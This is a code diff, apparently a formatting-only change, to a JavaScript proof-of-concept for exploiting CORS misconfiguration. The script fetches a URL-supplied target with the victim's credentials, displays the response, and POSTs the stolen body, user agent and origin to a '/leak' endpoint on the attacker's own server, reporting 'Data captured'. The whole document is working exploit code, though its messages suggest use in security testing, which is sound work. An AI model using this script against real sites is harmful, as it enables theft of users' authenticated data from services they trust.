@@ -11,7 +11,7 @@ function log(msg, type = 'info') {
     console.log('[' + type + ']', msg);
 }
 
-(function() {
+(function () {
     const params = new URLSearchParams(window.location.search);
     const target = params.get("target");
 
@@ -29,37 +29,37 @@ function log(msg, type = 'info') {
         credentials: 'include',
         mode: 'cors'
     })
-    .then(resp => {
-        log("Got " + resp.status + " " + resp.statusText, resp.ok ? 'success' : 'warn');
-        return resp.text();
-    })
-    .then(body => {
-        log("Received " + body.length + " bytes", 'success');
+        .then(resp => {
+            log("Got " + resp.status + " " + resp.statusText, resp.ok ? 'success' : 'warn');
+            return resp.text();
+        })
+        .then(body => {
+            log("Received " + body.length + " bytes", 'success');
 
-        document.getElementById('result').style.display = 'block';
-        document.getElementById('data').textContent = body;
+            document.getElementById('result').style.display = 'block';
+            document.getElementById('data').textContent = body;
 
-        return fetch("/leak", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                target: target,
-                timestamp: new Date().toISOString(),
-                data: body,
-                metadata: {
-                    'user-agent': navigator.userAgent,
-                    'origin': window.location.origin
-                }
-            })
+            return fetch("/leak", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    target: target,
+                    timestamp: new Date().toISOString(),
+                    data: body,
+                    metadata: {
+                        'user-agent': navigator.userAgent,
+                        'origin': window.location.origin
+                    }
+                })
+            });
+        })
+        .then(() => {
+            log("Data captured - check your terminal", 'success');
+        })
+        .catch(err => {
+            log(err.message, 'error');
+            log("", 'info');
+            log("This usually means CORS is configured correctly (good!).", 'info');
+            log("Or you're not authenticated to the target.", 'info');
         });
-    })
-    .then(() => {
-        log("Data captured - check your terminal", 'success');
-    })
-    .catch(err => {
-        log(err.message, 'error');
-        log("", 'info');
-        log("This usually means CORS is configured correctly (good!).", 'info');
-        log("Or you're not authenticated to the target.", 'info');
-    });
 })();
